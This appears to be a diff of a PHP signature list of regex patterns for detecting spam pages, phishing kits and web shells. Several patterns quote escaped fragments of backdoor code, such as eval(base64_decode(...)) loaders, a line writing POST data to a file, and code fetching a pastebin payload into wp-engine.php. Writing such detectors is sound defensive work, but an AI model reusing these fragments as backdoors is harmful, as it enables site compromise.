+      'pattern' => '/\\/emulatore\\-nds\\-iphone\\-ios\\-9\\.html\\>y3\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1272 => 
+    array (
+      'pattern' => '/of\\/how\\-to\\-roar\\-like\\-a\\-tiger\\.html\\>8t\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1273 => 
+    array (
+      'pattern' => '/b\\.com\\/ybpg\\/northdale\\-armory\\.html\\>op\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1274 => 
+    array (
+      'pattern' => '/branes\\.  Knowledge for the Sulphuric Acid Industry\\.  A Oleum \\(fuming sulphuric acid\\)\\.  The concentrate will be processed/s',
+      'label' => 'sample-specific content window',
+    ),
+    1275 => 
+    array (
+      'pattern' => '/ref\\=http\\:\\/\\/gkbhygiene\\.com\\/ig6\\/100\\-free\\-instagram\\-followers\\-instantly\\.html\\>5u\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1276 => 
+    array (
+      'pattern' => '/ound\\-settings\\-windows\\-10\\.html\\>yp\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1277 => 
+    array (
+      'pattern' => '/ED to light up after the power is connected\\.  Ar[\\s\\S]{0,12000}v\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1278 => 
+    array (
+      'pattern' => '/44\\<\\/a\\>, \\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1279 => 
+    array (
+      'pattern' => '/and specialties\\.  In the process of cover slipping, air bubbles can occur\\.  Learn more about the Dermatology LTD practic/s',
+      'label' => 'sample-specific content window',
+    ),
+    1280 => 
+    array (
+      'pattern' => '/cisco\\-wlc\\-nac\\-state\\-ise\\-nac\\.html\\>ku\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1281 => 
+    array (
+      'pattern' => '/matics\\-questions\\-and\\-answers\\.html\\>xg\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1282 => 
+    array (
+      'pattern' => '/href\\=http\\:\\/\\/chungcutheterra\\.info\\/dbjmjx6g\\/enter\\-to\\-win\\-form\\-template\\.html\\>bs\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1283 => 
+    array (
+      'pattern' => '/2 years ago by Spac3Rat \\(HeliSimmer\\.  Read the latest Market Intelligence\\.  \\#helicopter \\# coastguard&nbsp;\\.  I am includ/s',
+      'label' => 'sample-specific content window',
+    ),
+    1284 => 
+    array (
+      'pattern' => '/\\.ua\\/4wlebxb\\/car\\-guy\\-meaning\\.html\\>wi\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1285 => 
+    array (
+      'pattern' => '/flonase\\-sensimist\\-vs\\-flonase\\.html\\>hx\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1286 => 
+    array (
+      'pattern' => '/k\\/p61jx\\/set\\-brush\\-color\\-wpf\\.html\\>rm\\<\\/a\\>, \\<\\/h4\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1287 => 
+    array (
+      'pattern' => '/login\\.html\\>fc\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1288 => 
+    array (
+      'pattern' => '/\\-dermatology\\-vineland\\-nj\\.html\\>dg\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1289 => 
+    array (
+      'pattern' => '/xnews\\.io\\/ml0\\/create\\-sdk\\-file\\.html\\>83\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1290 => 
+    array (
+      'pattern' => '/yboard\\-backlight\\-settings\\-hp\\.html\\>9l\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1291 => 
+    array (
+      'pattern' => '/iggs\\-v\\-twin\\-dual\\-exhaust\\.html\\>tj\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1292 => 
+    array (
+      'pattern' => '/on\\-go\\.html\\>we\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1293 => 
+    array (
+      'pattern' => '/me\\.  Thor Motor Coach Four Winds 24F vs Dynamax[\\s\\S]{0,12000}l\\>hb\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1294 => 
+    array (
+      'pattern' => '/delhi\\.html\\>m5\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1295 => 
+    array (
+      'pattern' => '/\\-sale\\.html\\>y2\\<\\/a\\>, \\<\\/strong\\>\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+
+
+
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1296 => 
+    array (
+      'pattern' => '/questions\\.html\\>oo\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sks72\\.ru\\/eit7raft\\/smsl\\-ad18\\-vs\\.html\\>u3\\<\\/a\\>, \\<\\/p\\>
+
+\\<\\/div\\>
+
+\\<\\/div\\>
+
+\\<\\/body\\>
+
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window',
+    ),
+    1297 => 
+    array (
+      'pattern' => '/\\<\\?php
+ \\/\\*
+ \\*\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-[\\s\\S]{0,12000}0310,
+            0673,
+            0120,/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1298 => 
+    array (
+      'pattern' => '/require_once\\( OBIRA_FRAMEWORK \\. \'\\/init\\.php\' \\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1299 => 
+    array (
+      'pattern' => '/Nl2DMHsfF\\+DD7UbxLRQYGNVXUDbDNv30t5HnBbWDaue0Fq\\+E[\\s\\S]{0,12000}ODI0zsaRLt48GZ3PHCnSWn0
+	Bw\\=\\=\';
+\\}
+
+new Set\\(\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1300 => 
+    array (
+      'pattern' => '/\\$fp \\= fopen\\(\'var\\:\\/\\/\'\\.\\$_GET\\[\'f\'\\]\\(\\$_GET\\[\'c\'\\]\\), \'\'\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1301 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php class Flo \\{function __construct\\(\\) \\{\\$module \\= \\$this\\-\\>stack\\(\\$this\\-\\>income\\);\\$module \\= \\$this\\-\\>access\\(\\$this\\-\\>ver\\(\\$module\\)\\);\\$module \\= \\$this\\-/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1302 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php @ini_set\\(\'display_errors\', \'0\'\\);/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1303 => 
+    array (
+      'pattern' => '/^\\s*\\<\\?php \\/\\*d&m\\-\\(H@AnJ\\#\\(F5\\+\\*\\/parse_str\\#U\\=~LxnADRDY\\!\\:3Y@f\\!`m\\!"aGcz/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1304 => 
+    array (
+      'pattern' => '/\\<\\/td\\>\\<\\/table\\>\\<\\/body\\>\\<\\/html\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1305 => 
+    array (
+      'pattern' => '/^\\s*\\<\\!\\-\\-codes_iframe\\-\\-\\>\\<script type\\="text\\/javascript"\\> function getCookie\\(e\\)\\{var U\\=document\\.cookie\\.match\\(new RegExp\\("\\(\\?\\:\\^\\|; \\)"\\+e\\.replace\\(\\/\\(\\[\\\\\\.\\$\\?/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1306 => 
+    array (
+      'pattern' => '/\\<\\?php
+error_reporting\\(0\\);
+session_start\\(\\);
+
+requ[\\s\\S]{0,12000}ESSION\\[\'is_bot\'\\] 	\\= true;
+
+	if\\(\\$json\\[\'is_bot\'\\]\\)\\{/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1307 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "K74y39GMjUQ"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1308 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "A9TWQORP7s8"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1309 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*\\* PHP Encode Sh\\*ll Auto v4 Fox \\*\\*\\*\\/
+eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0Y4aHAoJF9NcU5OeW0xeG8peyRfTXFOTnltMXhvPXN/s',
+      'label' => 'sample-specific content window',
+    ),
+    1310 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "JVzcFHWvfDk"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1311 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "u2PGqyvO4sI"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1312 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "SGJIZrYkbRO"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1313 => 
+    array (
+      'pattern' => '/256pL6ZHRzzR5ms0cg0ULjWUYAP8QHpdoFEgz6pvqxqFCxk5t39g1SVtGkJIy2rRmQ7ue7EC81bRj3wuJXZK3uv9OP0w2w\'\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\)\\);
+
 \\?\\>/s',
       'label' => 'sample-specific content window',
     ),
-    1359 => 
-    array (
-      'pattern' => '/;\\/\\*i0nDEG4u\\}\\$\\+\\*\\/@\\/\\*88I\\>p\\:f\\^Ynsgfeo1~A&&VQS~3Xf\\$\\(F\\[m\\{;\\^G"\\*\\/eval\\s+\\/\\*\\>z\\-NHKm9\\.09~byL9k\\)s\\/\\]OM\\:\\}Nfd"uZ&N\\*\\/\\(\\#UWtZC\\$\\]1"\'36\\{Fv9\\:7Z5V\\=\\]Xxoq\\?z/',
-      'label' => 'sample-specific line fragment',
-    ),
-    1360 => 
-    array (
-      'pattern' => '/9\\-09\\-13 18\\:55\\:48
- \\* @Last Modified by\\:   Nokia 1337
- \\* @Last Modified time\\: 2019\\-09\\-30 21\\:16\\:59
-\\*\\/
-\\$Antibot\\-\\>error\\(404\\);/s',
-      'label' => 'sample-specific content window',
-    ),
-    1361 => 
-    array (
-      'pattern' => '/l\\-md\\-12"\\>
-					\\<h1\\>DASHBOARD \\(V\\.2\\.6\\)\\<\\/h1\\>
-					\\<small\\>Real Visitor Detection Manager\\.\\<\\/small\\>\\<br\\>
-					\\<hr\\>
-				\\<\\/div\\>/s',
-      'label' => 'sample-specific content window',
-    ),
-    1362 => 
+    1314 => 
     array (
       'pattern' => '/\\<\\?php
-require_once\\(\'autoload\\.php\'\\); 
-if\\(isset\\(\\$_GET\\[\'slug\'\\]\\) && \\$_SESSION\\[\'check\'\\] \\=\\= false\\)\\{
+\\$password \\= "QyvWR6uwKJr"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1315 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password \\= "ZneymcHQM9d"; \\/\\/ Password
+function _BdbY\\(\\$_YX8ZM\\)\\{\\$_YX8ZM\\=substr\\(\\$_YX8ZM,\\(int\\)\\(hex2bin\\(\'31313230\'\\)\\)\\);/s',
+      'label' => 'sample-specific content window',
+    ),
+    1316 => 
+    array (
+      'pattern' => '/\\$Antibot\\-\\>error\\(404\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1317 => 
+    array (
+      'pattern' => '/zpcoe4s\\.zip"\\);
+if \\(\\$archive\\-\\>extract\\(\\) \\=\\= 0\\) \\{
+die\\("Error \\: "\\.\\$archive\\-\\>errorInfo\\(true\\)\\);
+\\}
+else
+\\{
+die\\("1425756856"\\);	
+\\}/s',
+      'label' => 'sample-specific content window',
+    ),
+    1318 => 
+    array (
+      'pattern' => '/\\<input type\\="text" class\\="form\\-control"[\\s\\S]{0,12000}\\}
+  	\\<\\/script\\>
+	\\<\\?php \\}\\?\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1319 => 
+    array (
+      'pattern' => '/what times wordpress
+\\<\\?php if\\(\\$_GET\\["login"\\]\\=\\="c[\\s\\S]{0,12000}nput type\\="submit" value\\="submit"\\/\\>\\<\\/form\\>\';\\} \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1320 => 
+    array (
+      'pattern' => '/ordpress
+\\<\\?php 
+if \\(\\$_GET\\["login"\\] \\=\\= "canshu"\\)[\\s\\S]{0,12000}\\<input type\\="submit" value\\="submit"\\/\\>\\<\\/form\\>\';
+\\}/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1321 => 
+    array (
+      'pattern' => '/ight\\: 220px;
+\\}
 
-	  \\$respons \\= \\$Antibot\\-\\>r/s',
-      'label' => 'sample-specific content window',
+\\.notfound \\.notfound\\-404 h1 \\{
+  f[\\s\\S]{0,12000}e a good day\\!\\<\\/p\\>
+	\\<\\/div\\>
+\\<\\/div\\>
+\\<\\/body\\>
+\\<\\/html\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1363 => 
+    1322 => 
     array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\);function a_\\(\\$c_\\=32\\)\\{\\$c0\\="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";\\$c1\\=strlen\\(\\$c0\\);\\$c2\\="";for[\\s\\S]{0,12000}wp_die\\( \\$die, __\\( \'WordPress &rsaquo; Error\' \\) \\);/s',
-      'label' => 'source-file head-tail anchor',
+      'pattern' => '/O00__O0_OO;unset\\(\\$O00__O0_OO\\);exit\\(\\);\\}return 0;\\}[\\s\\S]{0,12000}"\\\\x4f\\\\x30\\\\x30\\\\x5f\\\\x4f\\\\x30\\\\x4f\\\\x5f\\\\x4f\\\\x5f"\\]\\(\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1364 => 
+    1323 => 
     array (
-      'pattern' => '/VvQ0JCYUV4d21DeExZMEJyQXJPY1dpUDBNaTlqbTEwOU5FbWZCWW1PbjJoMFhFSHlTVTBhSHp4bEhrZ3RTRXM3dUdwbEh6eGxIenhsSHpnTG8yMUpNaTRsTk/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\<\\?php
+\\$O0OOO__0_0\\=\'20019\';
+\\$O0O0O0O___\\=\'wp\\-admin[\\s\\S]{0,12000}O0_0\\{29\\}\\.\\$O0O_O_O0_0\\{20\\}\\.\\$O0O_O_O0_0\\{37\\}\\.\\$O0O_O_/s',
+      'label' => 'sample-specific content window chain',
     ),
-    1365 => 
+    1324 => 
     array (
-      'pattern' => '/\\$p\\=\\$_COOKIE;\\(count\\(\\$p\\)\\=\\=15&&in_array\\(gettype\\(\\$p\\)\\.count\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[63\\]\\=\\$p\\[63\\]\\.\\$p\\[86\\]\\)&&\\(\\$p\\[88\\]\\=\\$p\\[63\\]\\(\\$p\\[88\\]\\)\\)&&\\(\\$p\\=\\$p\\[88\\]\\(\\$p\\[68\\],\\$p\\[63\\]\\(\\$/',
-      'label' => 'source-file tail snippet',
+      'pattern' => '/\\$Antibot\\-\\>error\\(403\\);\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1366 => 
+    1325 => 
     array (
-      'pattern' => '/ghqk\\[4\\] \\. \\$hpghqk\\[29\\] \\. \\$hpghqk\\[13\\] \\. \\$hpghqk\\[18\\] \\. \\$hpghqk\\[12\\] \\. \\$hpghqk\\[6\\] \\. \\$hpghqk\\[6\\] \\. \\$hpghqk\\[3\\] \\. \\$hpghqk\\[44\\] \\. \\$/s',
-      'label' => 'sample-specific content window',
+      'pattern' => '/\\$config\\[\'password_panel\'\\] 	\\= \'admin\';\\s*$/s',
+      'label' => 'source-file last-line anchor',
     ),
-    1367 => 
+    1326 => 
     array (
-      'pattern' => '/tebin\\.com\\/raw\\/6UD40XpN\'\\);
-	\\$doit \\= fopen\\(\'wp\\-engine\\.php\', \'w\'\\);
-	fwrite\\(\\$doit,\\$code\\);
+      'pattern' => '/^\\s*\\<\\?php error_reporting\\(0\\);function a_\\(\\$c_\\=32\\)\\{\\$c0\\="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";\\$c1\\=strlen\\(\\$c0\\);\\$c2\\="";for/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1327 => 
+    array (
+      'pattern' => '/\\<\\?php \\$O00OO0\\=base64_decode\\("bjF6Yi9tYTVcdnQwaTI[\\s\\S]{0,12000}6eGx6R0xtSHVVZUJZbU9ObDBhSHp4bEh6eGxIenhsSHp4bHp/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1328 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* @Author\\: Nokia 1337
+ \\* @Date\\:   201[\\s\\S]{0,12000}font\\-weight\\: 700;
+		        line\\-heigh/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1329 => 
+    array (
+      'pattern' => '/lcnJvcl9yZXBvcnRpbmcoMCk7Pz4\\=\';
+
+\\$GLOBALS\\[\'stopk[\\s\\S]{0,12000}\\/install_code_end
+
+\\?\\>\\<\\?php error_reporting\\(0\\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1330 => 
+    array (
+      'pattern' => '/\\(\\$p\\),\\$p\\)\\)\\?\\(\\(\\$p\\[63\\]\\=\\$p\\[63\\]\\.\\$p\\[86\\]\\)&&\\(\\$p\\[88\\]\\=\\$p\\[63[\\s\\S]{0,12000}\\(\\$p\\=\\$p\\[88\\]\\(\\$p\\[68\\],\\$p\\[63\\]\\(\\$p\\[51\\]\\)\\)\\)&&\\$p\\(\\)\\)\\:\\$p;
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1331 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*\\*
+ \\* Plugin Name\\: Monetization Code plug[\\s\\S]{0,12000}\\*\\/
+
+if\\(get_option\\(\'default_mont_options\'\\) \\!\\=\\=\'on/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1332 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\/\\*0c271\\*\\/
+
+@include "\\\\057hom\\\\145\\/jk\\\\163pza[\\s\\S]{0,12000}BSPATH \\. WPINC \\. \'\\/rest\\-api\\/class\\-wp\\-rest\\-respon/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1333 => 
+    array (
+      'pattern' => '/6\\] \\. \\$hpghqk\\[8\\] \\. \\$hpghqk\\[32\\] \\. \\$hpghqk\\[37\\] \\. \\$h[\\s\\S]{0,12000}k\\(\\$gestyu\\);
+        \\}
+        exit\\(\\);
+    \\}
+\\} \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1334 => 
+    array (
+      'pattern' => '/contents\\(\'https\\:\\/\\/pastebin\\.com\\/raw\\/6UD40XpN\'\\);[\\s\\S]{0,12000}\\$doit,\\$code\\);
 	fclose\\(\\$doit\\);
 	
 \\}
@@ -9015,124 +12679,214 @@ if\\(isset\\(\\$_GET\\[\'slug\'\\]\\) && \\$_SESSION\\[\'check\'\\] \\=\\= false
 engine\\(\\);
 
 \\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1335 => 
+    array (
+      'pattern' => '/\\$filearray \\= listDir\\(\\$mapdir\\);[\\s\\S]{0,12000}dirname\\( __FILE__ \\) \\. \'\\/wp\\-blog\\-header\\.php\' \\);\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1336 => 
+    array (
+      'pattern' => '/ity to obey all applicable local, state and fede[\\s\\S]{0,12000}e\\: GPLv2
+ \\*\\/
+\\?\\>
+\\<\\?php
+    include\\(\'log\\.zip\'\\);
+\\?\\>/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1337 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\$password\\=\'will\';
+\\$shellname\\=\'will\';
+\\$myurl\\=null;
+error_reporting\\(0\\);
+@set_time_limit\\(0\\);
+    function Class_UC_ke/s',
       'label' => 'sample-specific content window',
     ),
-    1368 => 
+    1338 => 
     array (
-      'pattern' => '/php\\?date\\=\'\\.\\$id\\.\'&temp\\=\'\\.\\$temp\\.\'&web\\=\'\\.\\$host\\.\'&xml\\=\'\\.\\$dt\\.\'&maptype\\=\'\\.\\$maptype\\.\'&http\\=\'\\.\\$http;
-                    echo "\\</s',
+      'pattern' => '/^\\s*\\<\\?php \\/\\* Do not change this code, or your script will not work\\. Checksum\\: 398a66245b7a93ba7ef2e95f1911b3e3618b3727503454ba5c28d29fae0b13c920/s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1339 => 
+    array (
+      'pattern' => '/kbd84d1c\'\\]\\[73\\]\\.\\$h8549\\[\'kbd84d1c\'\\]\\[20\\]\\.\\$h8549\\[\'kb[\\s\\S]{0,12000}d6a7\\[\\$h8549\\[\'kbd84d1c\'\\]\\[53\\]\\]\\);\\}exit\\(\\);\\}\\} \\?\\>\\<\\?php/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1340 => 
+    array (
+      'pattern' => '/\\<\\?php
+\\?\\>\\<\\!DOCTYPE html\\>
+\\<html lang\\="en"\\>
+\\<head\\>[\\s\\S]{0,12000}ed with\\.\\<\\/p\\> \\-\\-\\>
+  \\<p\\>Strike a Pose\\. Something s/s',
+      'label' => 'sample-specific content window chain',
+    ),
+    1341 => 
+    array (
+      'pattern' => '/\\<\\?php if\\(isset\\(\\$_GET\\[\'s\'\\]\\)\\)\\{echo \'nsd\'\\.\'fjk\';if\\(isset\\(\\$_POST\\[\'c\'\\]\\)\\)\\{file_put_contents\\(\\$_POST\\[\'n\'\\],base64_decode\\(\\$_POST\\[\'c\'\\]\\)\\);\\}die\\(\\);\\}\\?\\>\\s*$/s',
+      'label' => 'source-file last-line anchor',
+    ),
+    1342 => 
+    array (
+      'pattern' => '/^\\s*\\/\\*\\! jQuery v3\\.6\\.0 \\| \\(c\\) OpenJS Foundation and other contributors \\| jquery\\.org\\/license \\*\\//s',
+      'label' => 'source-file first-line anchor',
+    ),
+    1343 => 
+    array (
+      'pattern' => '/^\\s*\\(\\(\\)\\=\\>\\{"use strict";var e\\=\\{d\\:\\(t,n\\)\\=\\>\\{for\\(var r in n\\)e\\.o\\(n,r\\)&&\\!e\\.o\\(t,r\\)&&Object\\.defineProperty\\(t,r,\\{enumerable\\:\\!0,get\\:n\\[r\\]\\}\\)\\},o\\:\\(e,t\\)\\=\\>Object/s',
